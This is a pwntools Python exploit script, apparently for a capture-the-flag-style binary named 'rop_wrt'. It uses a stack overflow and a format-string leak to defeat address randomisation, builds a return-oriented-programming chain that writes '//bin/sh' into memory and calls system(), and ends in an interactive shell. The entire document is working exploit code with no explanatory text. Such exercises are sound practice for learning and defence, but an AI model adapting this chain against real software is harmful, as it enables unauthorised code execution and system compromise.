from pwn import *

FILE = "./rop_wrt"
elf = ELF(FILE)
context.binary = binary = FILE
context.log_level = "debug"

PADDING = b'A' * 32
CANARY = b'ABCD'

p = payload = PADDING + CANARY + cyclic(32)
io = process(FILE)

io.recv()
io.sendline(CANARY) # just sending junk

io.recv()
io.sendline(p)

io.wait()

corefile = Coredump("./core")
lenUntilRIP = cyclic_find(corefile.fault_addr)

SHOVEL = b"%7$p.%15$p"

FGETS_OFFSET = 0x70200
WRITE_GADGET_OFFSET = 0x1375
POP_RDI_OFFSET = 0x1371
POP_RCX_OFFSET = 0x1373
RET_TO_MAIN_OFFSET = 0x11e8  
SYSTEM_OFFSET = 0x45880
DATA_OFFSET = 0x4044

io = process(FILE)

io.recv()
io.sendline(SHOVEL)
memLeak =  io.recvuntil('\n');
io.recv()

leakArray = str(memLeak).split('.')

RET_TO_MAIN_ADDRESS = leakArray[1][:-3]
FGETS_ADDRESS = leakArray[0].replace("b'", '')

DIFF_FOR_WRITE = WRITE_GADGET_OFFSET - RET_TO_MAIN_OFFSET
DIFF_FOR_RDI = POP_RDI_OFFSET - RET_TO_MAIN_OFFSET
DIFF_FOR_RCX = POP_RCX_OFFSET - RET_TO_MAIN_OFFSET

# pop rax; mov QWORD PTR [rcx], rax; ret
WRITE_GADGET_ADDR = int(RET_TO_MAIN_ADDRESS,16) + DIFF_FOR_WRITE
POP_RDI_ADDR = int(RET_TO_MAIN_ADDRESS,16) + DIFF_FOR_RDI
POP_RCX_ADDR = int(RET_TO_MAIN_ADDRESS,16) + DIFF_FOR_RCX

LIBC_ADDRESS = int(FGETS_ADDRESS, 16) - FGETS_OFFSET
SYSTEM_ADDRESS = LIBC_ADDRESS + SYSTEM_OFFSET

WRITE_ADD_OFFSET =  0x5555555580a0 - 0x5555555551e8 
WRITE_ADDRESS = int(RET_TO_MAIN_ADDRESS, 16) + WRITE_ADD_OFFSET

print('\n')
print("     POP RDI: " + hex(POP_RDI_ADDR))
print("     POP RCX: " + hex(POP_RCX_ADDR))
print("Write Gadget: " + hex(WRITE_GADGET_ADDR))
print('')
print("        libc: " + hex(LIBC_ADDRESS))
print("     fgets(): " + FGETS_ADDRESS)
print("    system(): " + hex(SYSTEM_ADDRESS))
print("         hmm: " + hex(WRITE_ADDRESS))
print('\n')

#print(io.pid)
#pause()

p = PADDING + CANARY + b'B' * lenUntilRIP
p += p64(POP_RCX_ADDR)
p += p64(WRITE_ADDRESS)# hmm[0]
p += p64(WRITE_GADGET_ADDR)
p += b'//bin/sh' #//bin/sh
p += p64(POP_RDI_ADDR)
p += p64(WRITE_ADDRESS)# hmm[0]
p += p64(SYSTEM_ADDRESS)

io.sendline(p)
io.interactive()
